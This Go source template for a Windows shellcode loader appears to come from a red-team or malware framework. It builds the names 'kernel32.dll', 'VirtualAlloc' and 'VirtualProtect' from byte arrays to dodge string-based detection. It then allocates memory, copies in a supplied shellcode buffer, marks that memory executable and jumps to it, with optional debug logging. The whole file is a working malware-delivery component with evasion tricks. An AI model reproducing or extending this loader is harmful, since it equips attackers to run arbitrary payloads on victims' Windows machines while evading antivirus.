func run( shellcode []byte) {

	const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	)
    
	{{if .Debug}}
	printDebug("info","Loading kernel32.dll")
	{{end}}

	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	//ntdll := windows.NewLazySystemDLL("ntdll.dll")
	//msvcrt := windows.NewLazyDLL(string([]byte{'m','s','v','c','r','t','.','d','l','l'}))

    {{if .Debug}}
	printDebug("info","Loading VirtualAlloc, VirtualProtect procedures...")
	{{end}}
    	
	VirtualAlloc := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','A','l','l','o','c'}))
	VirtualProtect := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','P','r','o','t','e','c','t'}))
	//memcpy := msvcrt.NewProc(string([]byte{'m','e','m','c','p','y'}))

	{{if .Debug}}
	printDebug("info","Calling VirtualAlloc for shellcode...")
	{{end}}
	{{if .Debug}}
	printDebug("info","Length of the shellcode: %d bytes",len(shellcode))
	{{end}}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != syscall.Errno(0)  {
		{{if .Debug}}
		printDebug("error","Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
		{{end}}
		return
		
	}

	if addr == 0 {
		{{if .Debug}}
		printDebug("error","VirtualAlloc failed and returned 0")
		{{end}}
		return
	}

	{{if .Debug}}
	printDebug("info","Allocated %d bytes", len(shellcode))
	{{end}}

	{{if .Debug}}
	printDebug("debug","Copying shellcode to memory...")
	{{end}}
	//_, _, errMemCpy := memcpy.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
//
	//if errMemCpy != nil && errMemCpy != syscall.Errno(0)  {
	//	{{if .Debug}}
	//	printDebug("error","Error calling memcpy:\r\n%s", errMemCpy.Error())
	//	{{end}}
	//	return
	//}

	buff := (*[1890000]byte)(unsafe.Pointer(addr))
	for x, y := range shellcode {
		buff[x] = y
	}
	{{if .Debug}}
	printDebug("debug","Change payload memory protection to PAGE_EXECUTE_READ")
	{{end}}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect != syscall.Errno(0) {
		{{if .Debug}}
		printDebug("error", "Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
		{{end}}
		return
	}
	{{if .Debug}}
	printDebug("info","Execute the shellcode...")
	{{end}}
	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != syscall.Errno(0) {
		{{if .Debug}}
		printDebug("error","Error executing shellcode syscall:\r\n%s", errSyscall.Error())
		{{end}}
		return
	}
}